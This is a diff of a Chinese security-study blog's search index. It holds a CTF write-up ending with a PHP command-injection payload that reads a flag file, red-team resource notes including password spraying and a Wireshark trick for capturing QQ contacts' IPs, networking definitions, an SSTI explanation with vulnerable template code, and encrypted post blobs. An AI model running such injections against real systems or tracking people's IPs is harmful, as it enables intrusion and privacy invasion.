+<p><img data-src="/../images/WRITEUP/image-20221109152958908.png" alt="image-20221109152958908"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?page=&#x27;).system(&#x27;cat+./templates/flag.php&#x27;);//</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/WRITEUP/image-20221109153131832.png" alt="image-20221109153131832"></p>
+<p>查看源代码，得到flag</p>
+<p><img data-src="/../images/WRITEUP/image-20221109153155469.png" alt="image-20221109153155469"></p>
+<p><code>cyberpeace&#123;2172f21f4199956826ac65ef621201b4&#125;</code></p>
 <h1 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h1><h2 id="Vim缓存"><a href="#Vim缓存" class="headerlink" title="Vim缓存"></a>Vim缓存</h2><p>1.当vim在编辑文档的过程中如果异常退出，则会产生缓存文件。第一次产生的缓存文件后缀为.swp，第二次则产生的缓存文件后缀为.swo,第三次产生的缓存文件后缀为.swn。</p>
 <p>2.使用命令vim -r 可以查看当前目录下的所有swp文件。</p>
 <p>3.使用命令vim -r filename可以恢复文件，这样上次意外退出并且没有保存的修改，就可以覆盖文件。</p>
@@ -1655,20 +1696,92 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2022/08/30/hello-world/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="3fbf53f127f9724098f1685893429b30cd0981d9136b5965b537eb10218c09c3">165d50f05814027fb7fe5e4ae8a088d83a3c45e1f62d098feb303294e4ed6e4f25c65523774c3d6ea870bc5736ab28c0c9d794c41287fea5c81920506ddf2623ce7f92c59285f1791066d6d5cedb691ed56b6cfd48a4d8aee54788f02cd7988ff0a5e44165a0d41640c586e68e587f72282fef9f4334df3f5c52c28b0e47bb5a872cdcf183526aefffaa49fd2b83f3fc9e38be672677af6778a9ccf7dcc5da2d4db1f6b31a6c80bf842cab813b239cad1622475c59655a171d83c059b9da884fa4e1815bcba998ca242b8ef1ab2744f1a66cd2f370e099e1ee3b8875a2d30e40122dcaba723ca2fb973019f1ca39197381a0bcf661d35835a1e002e529a08addd1877d1b22e23b3d5ce23f2ab807bfdf45111fb1dd1c1b71ccad2c0f655929d566e83b9526db4dbf046de778ae74b15755372a95a241a820d6fcdca835f7cfd54cd5db7f84bfe627a613be8bd99c7627d1869606eddf538097e27d7c35fb31bd26842e2a40ef31457feffce2ee0298f59bbd668ac3c0630ada2e31b5e6e17cdfe56aedb2d08284dd8442652567a266d52272469129de37c0a022e61dfcc52702fcaa7277c824c7e9db5b01d45f02ca9b135778b50b0bfde509cc7ec807d089ab3d79a261493a795985b3aeb99cfffcdd4df27ffe10f036430be74b38cf8736dc01a7bd825903217ec8dd39410177bbd18fd0465383f852320694a7f5cdf71d4c1e09b3d9c851cb81f494eee6baecd526e554e609f66eebfa1128435108ecf9b1f6a6cbd6bec3e126cc4d7413390426bfe99e79cf1ca31dc32bca2b638f48b34d428b9901291050be054092daa42b79f58ace5f776b46d4050316df3b4fb494071d3a99b203512f6a90dd1bd570050514a1bc91d1e47adcca47475c423c661ea142498328a7a396a54eb2fa3c5b812bb70c57558f1457ab3b2657b8e232c20ed64e699a70585de813988aefa6e129b3f55fff0b00f0e4f767fa735082a838efbf6617a4d16f0737543a7c6b3332b7f6c355a864ec7378e36d0afdf3ecc9e765dea86e68f212cf5b1e6bd7b5b5a317ed33cabc9ed4f7e7813402f156f5b124d10551df5d83e1c8e9e14d4e6e3f05d4a37b6d169995c11f87edd2341007f7442814cd1cf0fe871cc6f20205ed8c3657eb24eb400a0f53bc40ba142429320bbb6735382c29dc8d676d0e51a435ebd839a7ec22dede032d856365d1ffaf3a6d131bd04ff2a0f89c8aad0b3844ec2c57866adcfd4799e37407a5f1951071edaad14517f586d8efb3be3dd8629d2349cb96195dbaba39a4044d2955fbe2b8a94e1a4dcf5c887eff8dc6ac33fe5696284c1a3ecc977ec4dcba77add868d19985740505cd8b1fa1a417323076be25f37f5f2438c72bf2914f91e4592e36eae0125580583737bb1b2bd40b30f2ac2651d2bb5984e5b4646fb2141cf549e362430e9013bfc9bdc236beb7e2f77735816a75135adf23f2b6b010c4e270e0fe3679a84d2228c857e53f0d90c83e84d13e3cdbcd865128c56d7dbfe9c76f6a4539adaff73aabeb8475435b03a78d5029953c971ca6cbbf8a1df5a241a6c497cf0c987e336f49fee04fb2e752350399c01d7a1ecf778d80236af519fc6c55273b8a6e73f281e95f7921603499f43231d001703206dd1e9572491f1525cc81a7e7c1604a862cd32f59baccadbaa3cf6d82efae304b34cbc3064dbee3eecd52d18c4c5d0a87a015c0eea0a011599df9e4ebf0f1566555f869f759d2469ccaf392fbb08f6b711aecf59cb00e6941c9404d1957552f6054b7ef4de505c555ddbedf7512c0f019f16aaa9ffacf09de51c6127bae45299a33f6382d50f28fd4b776bf2e56d4423d9b9ce1038587bc210da79a2932572f937ca149bd6f5c4fc4f3c2264cc7b1616c1efc912d3d737c5c9bbd3a21e51b4f09fa1f0a7e52989d5ca8582978f25046495f571a69c16a2bd2d3f9f25e6d5d067e040224bb5e20e5a669ca00d49dd99355566c9f1871f7ef7c4ddf4535d0a7a1311d3d84bbd7fc65aa6d2d161672987e7a21b8381ae160026ccafcdac757931bdb27739a69e3c964328334995bcfdd5d7d8fae15d9e3d870611e8be36b3d62417c617a9fb2102422968a536d14677ed1768cdfa95a226270025663299478f2c2afcfe1a18e36946db6122f5aa8fa163085623562a3fb451d4d0abb8cd151d7be212d73d6d5db72ac4560468f4793ac476a2eb2ee19f5e8a3c6b6eeac74394e62693e741e5f018d2ee9c72dc84447d43dcf5523e517fc4485e48962a111da629db5c7103852c98728b7d68ebc064a5c59e5f59154497ec495b8e72f1c7972a00c5897971e7463572a1542f456fd7449b757d7cec20c70d4183f4794826ed8bb39413713dd44fdced93e7e84084bc4f297d7b3e2e5c2ae378afbd71aac3f7ade48f1fa3c1aae001a5a7a65fb247cd6d3167a0ba65d224a32836882664b57727d692b2a469610c4727ea89a5b952066545adc60a09161419201779766389aa0ae0bcaf4e41f0770876a169fe3a3aa52819c7c464616b58dbfbb363c2878c7b162c3a5f7b8e3db9bbb8e021a9af8463853b0abd6deeba6a5bc8adedc1e47d9eed3dc20110ab823fd2685067c34d6cb3db4d871ed3b0a904bafb4a482cec76a8bea9cc87a6374ba83709294c38870cb329182fe0930257f2034b8f259483b420d14836c5dc8159f065b7c2c517b344b624b48a4e2cfdddc46713cc91ea821f93370080d1140345c36b00aed50b89595dfe2655869053590f8469528412ef1308e8084333c69178d5d9ad290204b9ecad6ced99f2a170b13d067523628ce98a464aa0e4d8ef43202cfc50d8c830cd74800b1ca4ab75c2f710a6b8431cb21af49bf95db7fee5fa4818ad7866fa9f90476bb7c897ea0ce5ef2fceffa53ab46257e6baa5816154149e5180bded67e886bc4e31c36f3fceb5f731d6b04cd5692134497284b76225c3c899e1bcd66aa3b86982068c058c084e289ff610badfd5a62e3fccb256670955b71e0db5d5f75fefc5ddec6307a4ac955e160a5b39384b38daca1a44bc99002bee1270c899a1a8c1e2f552ff834efeb151506fd3951d7635cb746cb40afe5cd7b824abb96ea024664f6a3e7110302c5692ecbbf7219884013eee34c1079a4b5d62fd0065e3ed6824392f0f8267edf8840fe1432314f267dc6eb7b300261f576c14ac6aab9ef8909f0d9eba86dcbcbc9fe</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+    <title>hvv</title>
+    <url>/2022/09/15/hvv/</url>
+    <content><![CDATA[<p>微步</p>
+<span id="more"></span>
+
+<h2 id="情报平台"><a href="#情报平台" class="headerlink" title="情报平台"></a>情报平台</h2><p><a href="https://x.threatbook.com/">微步</a></p>
+<h2 id="HW重保之最强战神"><a href="#HW重保之最强战神" class="headerlink" title="HW重保之最强战神"></a>HW重保之最强战神</h2><p><a href="https://x.threatbook.com/v5/article?threatInfoID=11732">1</a></p>
+<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11770">2</a></p>
+<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11792">3</a></p>
+<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11823">4</a></p>
+<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11829">5</a></p>
+<p><img data-src="https://img.threatbook.com/d4484fb07ad1f6032cea3cb9c8563f18df4dfb87eebc54ab451e658290c00776.jpg" alt="img"></p>
+<p><img data-src="https://img.threatbook.com/f27b57cb15ff2495e045e8cf9381961f4852a29d96cefd28f5df7a859e1ec05f.jpg" alt="img"></p>
+<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11897">6</a></p>
+<p><img data-src="https://img.threatbook.com/22c1ebebd60772286b4859751e3683f13f38856b1458945a20a634c25e7ae745.png" alt="img"></p>
+<p><a href="https://x.threatbook.com/v5/article?threatInfoID=12014">7</a></p>
+<p><a href="https://x.threatbook.com/v5/article?threatInfoID=12157">8</a></p>
+<p><a href="https://x.threatbook.com/v5/article?threatInfoID=12496">9</a></p>
+<p><a href="https://x.threatbook.com/v5/article?threatInfoID=18563">10</a></p>
+<h2 id="重生之我是赏金猎人"><a href="#重生之我是赏金猎人" class="headerlink" title="重生之我是赏金猎人"></a>重生之我是赏金猎人</h2><p><a href="https://github.com/J0o1ey/BountyHunterInChina">https://github.com/J0o1ey/BountyHunterInChina</a></p>
+<p><a href="https://x.threatbook.com/v5/article?threatInfoID=13282">1</a></p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>代理池<a href="https://luminati-china.biz/">Luminati</a></p>
+<p><a href="https://market.aliyun.com/products/56956004">阿里云市场API</a></p>
+<p>Wireshark抓取QQ好友ip:020048是QQ电话的网络数据包中的关键词，通过打QQ电话，可以轻松抓取IP信息。</p>
+<p><a href="https://www.openstego.com/">OpenStego隐写工具</a></p>
+<p><a href="http://t.zoukankan.com/zlgxzswjy-p-6678081.html">NTFS文件流文件寄生</a></p>
+<p><a href="https://blog.csdn.net/wxh0000mm/article/details/121204656">autorun.inf</a></p>
+<p><a href="https://blog.csdn.net/qq_57307348/article/details/122904162">access注入</a></p>
+<p>amass子域名搜集工具</p>
+<p><strong>密码喷洒</strong>：在常规的爆破中，我们都是先用很多密码去碰撞一个账号，这样很容易导致账号被锁定。而密码喷洒就是先用一个密码去碰撞很多账号，此方法能有效的避免账号被锁定的问题</p>
+<p>获取了域用户后，进行密码喷洒</p>
+<p><a href="https://www.cnblogs.com/nongchaoer/p/16497098.html">内存马</a></p>
+<p><a href="https://hfish.io/#/">蜜罐HFish</a></p>
+<p><a href="https://x.threatbook.com/v5/article?threatInfoID=12125">github免杀项目</a></p>
+<p><a href="https://x.threatbook.com/v5/article?threatInfoID=11706">红队打点</a></p>
+]]></content>
+      <tags>
+        <tag>fun</tag>
+        <tag>study</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>专业术语</title>
+    <url>/2022/11/11/%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/</url>
+    <content><![CDATA[<center>学习一下概念模糊的专业术语</center>
+
+<span id="more"></span>
+
+<h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><p><strong>概念</strong></p>
+<p>中间件（英语：Middleware）顾名思义是系统软件和用户应用软件之间连接的软件，以便于软件各部件之间的沟通，特别是应用软件对于系统软件的集中的逻辑，是一种独立的系统软件或服务程序，分布式应用软件借助这种软件在不同的技术之间共享资源。中间件在客户服务器的操作系统、网络和数据库之上，管理计算资源和网络通信。总的作用是为处于自己上层的应用软件提供运行与开发的环境，帮助用户灵活、高效地开发和集成复杂的应用软件。</p>
+<p><strong>中间件一般提供如下功能</strong>：</p>
+<p>（1）通信支持</p>
+<p>（2）应用支持</p>
+<p>（3）公共服务</p>
+<blockquote>
+<p>总结：中间件≈<del>中介</del>≈<del>快递</del></p>
+</blockquote>
+<p><strong>常见的中间件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tomcat 8080</span><br><span class="line">Weblogic 7001</span><br><span class="line">Jboss</span><br><span class="line">Jetty</span><br><span class="line">apache hpptd</span><br><span class="line">Webshere 9080</span><br><span class="line">Glassfish</span><br></pre></td></tr></table></figure>
+
+<h1 id="负载均衡SLB"><a href="#负载均衡SLB" class="headerlink" title="负载均衡SLB"></a>负载均衡SLB</h1><p><strong>概念</strong></p>
+<p>负载均衡，英文名称为Load Balance，其含义就是指将负载（工作任务）进行平衡、分摊到多个操作单元上进行运行，例如FTP服务器、Web服务器、企业核心应用服务器和其它主要任务服务器等，从而协同完成工作任务。</p>
+<p><strong>负载均衡的分类</strong></p>
+<p>（1）软&#x2F;硬件负载均衡</p>
+<p>（2）本地&#x2F;全局负载均衡</p>
+<p><strong>部署模式</strong></p>
+<h1 id="正向代理、反向代理"><a href="#正向代理、反向代理" class="headerlink" title="正向代理、反向代理"></a>正向代理、反向代理</h1><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>正向代理是一个位于客户端和目标服务器之间的代理服务器（中间服务器）。为了从目标服务器取得内容，客户端向代理服务器发送一个请求，并且指定目标服务器，之后代理向目标服务器转发请求，将获得的内容返回给客户端。正向代理的情况下，客户端必须要进行一些特殊的设置才能使用。</p>
+<p>正向代理的典型用途是为防火墙内的局域网客户端提供访问服务器的途径，正向代理还可以使用缓冲特性减少网络利用率</p>
+<p><strong>用途</strong></p>
+<blockquote>
+<p>突破访问限制：通过代理服务器，可以突破自身ip访问限制，访问国外网站等<br>提高访问速度：通常代理服务器都设置一个较大的硬盘缓冲区，会将部分请求的响应保存到缓冲区中，当其他用户再访问相同的信息时，则直接由缓冲区中取出信息，传给用户，以提高访问速度<br>隐藏客户端真实ip：上网者可以通过正向代理的方法隐藏自己的ip，免受攻击</p>
+</blockquote>
+<h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p><strong>概念</strong></p>
+<p>反向代理是指以代理服务器来接收客户端的请求，然后将请求转发给内部网络上的服务器，将从服务器上得到的结果返回给客户端，此时代理服务器对外表现为一个反向代理服务器。</p>
+<p>对于客户端来说，反向代理就相当于目标服务器，只需要将反向代理当作目标服务器一样发送请求就可以了，并且客户端不需要进行任何设置。</p>
+<p><strong>用途</strong></p>
+<blockquote>
+<p>隐藏服务器真实ip：使用反向代理，可以对客户端隐藏服务器的ip地址<br>负载均衡：反向代理服务器可以做负载均衡，根据所有真实服务器的负载情况，将客户端请求分发到不同的真实服务器上<br>提高访问速度：反向代理服务器可以对静态内容及短时间内有大量访问请求的动态内容提供缓存服务，提高访问速度<br>提供安全保障：反向代理服务器可以作为应用层防火墙，为网站提供对基于web的攻击行为（例如DoS&#x2F;DDoS）的防护，更容易排查恶意软件等。还可以为后端服务器统一提供加密和SSL加速（如SSL终端代理），提供HTTP访问认证等。</p>
+</blockquote>
+<p>举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">正向代理：A急需一笔钱，他直接向马x借钱，但是他俩之间毫无关系，结果当然是借不到。而A的邻居老王是马x的好朋友，于是A请求老王，让老王帮忙向马x借钱，最终马x同意借钱给老王，老王把钱转给了A。</span><br><span class="line">反向代理：如果遇到困难需要拨打10086客服电话，可能一个地区的10086客服有几十个，但是我们不需要关心电话那头的人是谁。只需要拨通10086的总机号码，电话那头总有客服会回应。</span><br></pre></td></tr></table></figure>
+
+<h1 id="SAAS、PAAS、IAAS、DAAS"><a href="#SAAS、PAAS、IAAS、DAAS" class="headerlink" title="SAAS、PAAS、IAAS、DAAS"></a>SAAS、PAAS、IAAS、DAAS</h1><h1 id="VPC、VPN、VPS"><a href="#VPC、VPN、VPS" class="headerlink" title="VPC、VPN、VPS"></a>VPC、VPN、VPS</h1><h1 id="网络访问控制列表ACL"><a href="#网络访问控制列表ACL" class="headerlink" title="网络访问控制列表ACL"></a>网络访问控制列表ACL</h1>]]></content>
+      <tags>
+        <tag>study</tag>
+      </tags>
   </entry>
   <entry>
     <title>常用工具</title>
@@ -1678,6 +1791,7 @@
 <span id="more"></span>
 
 <h1 id="加解密-x2F-码"><a href="#加解密-x2F-码" class="headerlink" title="加解密&#x2F;码"></a>加解密&#x2F;码</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p><a href="https://cyberchef.org/">万能解码工具</a></p>
+<p><a href="http://ascii-converter.bchrt.com/">ascii、16进制、2进制、十进制、base64在线转换</a></p>
 <p><a href="https://www.qqxiuzi.cn/bianma/ascii.htm">ASCII编码转换)</a></p>
 <p><a href="https://tool.chinaz.com/tools/urlencode.aspx">URL编解码</a></p>
 <p><a href="https://base64.us/">Base64 在线编码解码</a></p>
@@ -1819,25 +1933,6 @@
 <script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
       <tags>
         <tag>fun</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>默认口令</title>
-    <url>/2022/10/24/%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="e7083e157921501e3bc34a366b64a8d31f975d336cc00f2bc333245eeaf8a412">f5ac9fae91cad559d5e13dc70330220c16e8d719b1b1f0c4f1b512f5c72db9b686e4ed3d42cbc58fd0fbcdd263ffd3bb753c3342b28750ba8a7581cc22d4b285d45e4a054e1b67a585313684dc207526c778d2b0378870e6dd6b0325c1006dce10c8ee278fc48506891cb799291c6229faca95c3a97a23a5284a5a0a7addbf9a8b3525024d7c4a8f4c846df8e1bd8b1eec2c1999455a1cb3eafbaa386c7827d58df44daa3029061a4c7950ea78af99f6626f10b7547a85b4e7f69b67598f1420fb27e7129615101be99c70131241138ed943d0a70ab2965055c9cf7c3495169e2b0714faad3716838be30009a52dd8d09da4dd49e03a695370f0b8ae00259142e95a38a2100cfc6f246aecfaa510ac567f4db62f90d5617263df9dac1c8bf093cde7e45ff42fe2ffe9fa33a0a1bf6bdf4c9c48ea2116f6927940ee20beec5fb03fc07f3b34e6fa39ae7b2acf80633198503bb78fea21f78c6c7aed136fe8c19e94090f97650cca1a9e30fb669aaf35af6213873398e69bd0dbd478bf00f1b93b8b37df5041c7d6de12f4ad49db2655e5570f0f617d8f004e8397266fb531d7d9d114cddaf21a802a1ffdabc7c5da009605a7ee6a0648efb5f6a0e3f74b5e512a9965ba58c78f997e346e744fd91177528da2932302f6aeb15a2dc21b910163be0b9dbdb987b7dfe9227781571a13c5a91c1d19c1db3538a73e777d133d91f03be5e95c0d419dffefcb2f10fbdd310a125fb9c895f5d0ea583156b34b3eb93722bb0fe5d65739828fbee136cf91b1f8a6b6d0adcae1dc2999aaa1dbd9329d232197b98da1460f7c747fe86a88545ea2f145968ac28541de1e1893004e713a6b79ff3bddd24df4b46cf7bde9c5d7494397e034855756dd8c2a6fca2b7d694fcb9b57f925d2aa3c7506b23fdfa0c8275aa4b34c1110ac41f6384d359f55d0c504ddd4d25ba6380ade9c9593a341f5a4e767d6807d5103877717f90be8f2b48a2612f537f1f9fd3fca2f1bd09ebb0b3d5c254c51bd1e788ca02d00ec85a0a8447535b421bf0c34a7b3bf5b59768f5f08ca6c41c15d23eca127b0450444494e653cc59b378825cfc8372ae8d9083257886f4392a2067fc31cc2c89dfdd09f833c3a063b6d1d5dd641e6e6bb53f93b77512cc63c7a38c5a9e2806a6d3c8b361987a64b3c20b60bca65d18cea8327429fae3c455374bc858de7c6037a022417b2a7442b1358db8730b2ee231dcd455948c1d28fc22aa8d9ef7becdf035d55980c989d491ed813f632b390d8c1969cb4b31d49357e21663ad4a8a5862347e7e75a7c0425a4cffbdf6492b0ef52ef244febb746fec9e57495464c48e22e01e71869ab481685768f0b290db77f0ec72e447c23e1965aa9e1249e06bcfb7016541397cd6633625a43b50fcb0b6466d38eead013e17c5fc04c296708509f2c53a9754601aff8a124c66848c3a7e999cba9caa0c38612d4203b362a6c8d5786978c10fc838f735cd6fe4694826dc6dacd47dc4d861b68d8fd4b3f62e91472f8ddecad780a3b82b1db29d87a6fd281cc57c20873e65c9e97a95a90ce2c102c65974845fc078209d432b6230b4b320d43e372f1b1f4472bd98d7a983c5a92debf30716dd1b5a669236420c59dc7bdbc6cdaf9cdbd8d2778c4e5da3de9cdc717313679a2efb9219a09b3b7f3624ce4b9f98d4c52118894b343b110fb8f48c9060dd1929e75a6f002fd9f5047b1dbc7067ba3d923c56584f443db772d420663a2ef388f5eec1a8519e3c26a847632d14cf12a9a050b21c4251c14b6c6b5cd05c22e1001b1f330b272bae5192d3e9a81e1f1989d86a2861eb43b73192122bc87998dbbb21bd9f0ae9fec19f1f7497baaa8077a0a51b88dbfa24fd4693e0c8e5417eed8eee7b00a058bcdc594e7580c6450603b001a1982bd447339326f367933ca241eb4cecec7b818b9ce6eaedeb3e45063afe52a9c1bacab655ef3539764d06c160673326ce95de3c6dee48dc3531f3296e8234902b002a806d3fcfe6789b2e3cb7afd0f20cc039ca253ada69739411a3050bdb36e13136fe7445f1615e8ebce80a49ee5b025dcaf8e23c277b03ce73135c8d51bc7d2d447de5b1679ae949d132e279bd80d98963aeeceba8748319fe1f38bdcdda54f83640935c3e1e3e6a41b0d94f5b8e3101b7f5423b98aba4ceb087463b6ffa21c04a6db17e23457a35442db0fbab1b6de96d81b9aaf06d318ef22aff3487db8b6c17631c15f8f23c0d01e90d824bd6d4af16f3f13eca075a327b21dae940fc6b4cc3a</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <tags>
-        <tag>tools</tag>
       </tags>
   </entry>
   <entry>
@@ -2229,9 +2324,50 @@
 <p>单引号和双引号中都可以使用转义字符\，但是，在单引号定义的字符串中只能转义单引号和转义符本身，而在双引号定义的字符串中，PHP 可以转义更多的特殊字符。</p>
 <p><img data-src="/../images/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YyX5rW35YyX77yM5Y2X5bGx5Y2X,size_15,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"></p>
 <p><strong>3、解析速度不同</strong><br>因为单引号不需要考虑变量的解析，所以处理速度比双引号要快，我们在定义字符串时应该尽量遵循能用单引号尽量用单引号的原则。</p>
+<h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><p>assert()函数其实是一个断言函数。</p>
+<p>assert函数在php语言中是用来判断一个表达式是否成立。返回true or false;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assert ( mixed $assertion [, string $description ] ) : bool</span><br><span class="line">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="服务器端模板注入-SSTI"><a href="#服务器端模板注入-SSTI" class="headerlink" title="服务器端模板注入(SSTI)"></a>服务器端模板注入(SSTI)</h1><p><a href="https://blog.csdn.net/weixin_53150482/article/details/125842465">参考</a></p>
+<p>服务器端模板注入是指攻击者能够使用模板语法将恶意有效负载注入模板，然后在服务器端执行该模板。注入任意模板指令以操纵模板引擎，使他们能够完全控制服务器。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当用户输入连接到模板中而不是作为数据传递时，就会出现服务器端模板注入漏洞</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传统静态模板：（不会产生此漏洞）</span><br><span class="line">$output = $twig-&gt;render(&quot;Dear &#123;first_name&#125;,&quot;, array(&quot;first_name&quot; =&gt; $user.first_name) );</span><br><span class="line">动态模板直接拼接：（漏洞产生）</span><br><span class="line">$output = $twig-&gt;render(&quot;Dear &quot; . $_GET[&#x27;name&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<h2 id="常见的模板引擎"><a href="#常见的模板引擎" class="headerlink" title="常见的模板引擎"></a>常见的模板引擎</h2><p>PHP</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Smarty:Smarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛</span><br><span class="line">2.Twig:Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。</span><br><span class="line">3.Blade:Blade 是 Laravel 提供的一个既简单又强大的模板引擎。</span><br><span class="line">和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何额外负担。</span><br></pre></td></tr></table></figure>
+
+<p>Java</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.JSP</span><br><span class="line">2.FreeMarker:FreeMarker是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</span><br><span class="line">3.Velocity:Velocity作为历史悠久的模板引擎不单单可以替代JSP作为Java Web的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。</span><br></pre></td></tr></table></figure>
+
+<p>Python</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.jinja2:flask jinja2一直是一起说的，使用非常的广泛</span><br><span class="line">2.django:django应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道 django 以快速开发著称，有自己好用的ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了</span><br><span class="line">3.tornado:tornado也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/eason612/article/details/124809784">待参考</a></p>
 ]]></content>
       <tags>
         <tag>study</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>默认口令</title>
+    <url>/2022/10/24/%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="e7083e157921501e3bc34a366b64a8d31f975d336cc00f2bc333245eeaf8a412">f5ac9fae91cad559d5e13dc70330220c16e8d719b1b1f0c4f1b512f5c72db9b686e4ed3d42cbc58fd0fbcdd263ffd3bb753c3342b28750ba8a7581cc22d4b285d45e4a054e1b67a585313684dc207526c778d2b0378870e6dd6b0325c1006dce10c8ee278fc48506891cb799291c6229faca95c3a97a23a5284a5a0a7addbf9a8b3525024d7c4a8f4c846df8e1bd8b1eec2c1999455a1cb3eafbaa386c7827d58df44daa3029061a4c7950ea78af99f6626f10b7547a85b4e7f69b67598f1420fb27e7129615101be99c70131241138ed943d0a70ab2965055c9cf7c3495169e2b0714faad3716838be30009a52dd8d09da4dd49e03a695370f0b8ae00259142e95a38a2100cfc6f246aecfaa510ac567f4db62f90d5617263df9dac1c8bf093cde7e45ff42fe2ffe9fa33a0a1bf6bdf4c9c48ea2116f6927940ee20beec5fb03fc07f3b34e6fa39ae7b2acf80633198503bb78fea21f78c6c7aed136fe8c19e94090f97650cca1a9e30fb669aaf35af6213873398e69bd0dbd478bf00f1b93b8b37df5041c7d6de12f4ad49db2655e5570f0f617d8f004e8397266fb531d7d9d114cddaf21a802a1ffdabc7c5da009605a7ee6a0648efb5f6a0e3f74b5e512a9965ba58c78f997e346e744fd91177528da2932302f6aeb15a2dc21b910163be0b9dbdb987b7dfe9227781571a13c5a91c1d19c1db3538a73e777d133d91f03be5e95c0d419dffefcb2f10fbdd310a125fb9c895f5d0ea583156b34b3eb93722bb0fe5d65739828fbee136cf91b1f8a6b6d0adcae1dc2999aaa1dbd9329d232197b98da1460f7c747fe86a88545ea2f145968ac28541de1e1893004e713a6b79ff3bddd24df4b46cf7bde9c5d7494397e034855756dd8c2a6fca2b7d694fcb9b57f925d2aa3c7506b23fdfa0c8275aa4b34c1110ac41f6384d359f55d0c504ddd4d25ba6380ade9c9593a341f5a4e767d6807d5103877717f90be8f2b48a2612f537f1f9fd3fca2f1bd09ebb0b3d5c254c51bd1e788ca02d00ec85a0a8447535b421bf0c34a7b3bf5b59768f5f08ca6c41c15d23eca127b0450444494e653cc59b378825cfc8372ae8d9083257886f4392a2067fc31cc2c89dfdd09f833c3a063b6d1d5dd641e6e6bb53f93b77512cc63c7a38c5a9e2806a6d3c8b361987a64b3c20b60bca65d18cea8327429fae3c455374bc858de7c6037a022417b2a7442b1358db8730b2ee231dcd455948c1d28fc22aa8d9ef7becdf035d55980c98